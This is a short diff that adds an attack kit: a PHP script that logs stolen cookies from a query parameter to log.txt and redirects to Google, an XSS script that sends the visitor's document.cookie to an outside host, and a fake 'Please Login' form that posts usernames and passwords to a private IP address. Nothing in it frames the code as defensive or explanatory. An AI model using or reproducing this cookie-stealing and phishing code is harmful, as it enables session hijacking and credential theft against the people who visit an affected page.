@@ -1,0 +1,19 @@
+<?php
+	header ('Location:https://google.com');
+	$cookies = $_GET["c"];
+	$file = fopen('log.txt', 'a');
+	fwrite($file, $cookies, "aaaaaaaaa", "\n\n");
+?>
+
+<script type="text/javascript">
+	document.location="http://www.nguyenvanha.infinityfreeapp.com/code.php?c="+document.cookie;
+</script>
+
+
+
+<h3>Please Login to proceed</h3>
+<form action=http://192.168.146.136:5555>
+Username:<br><input type="username" name="username">
+<br>Password:
+<br><input type="password" name="password"></br>
+<br><input type ="submit" value="Login"></br>
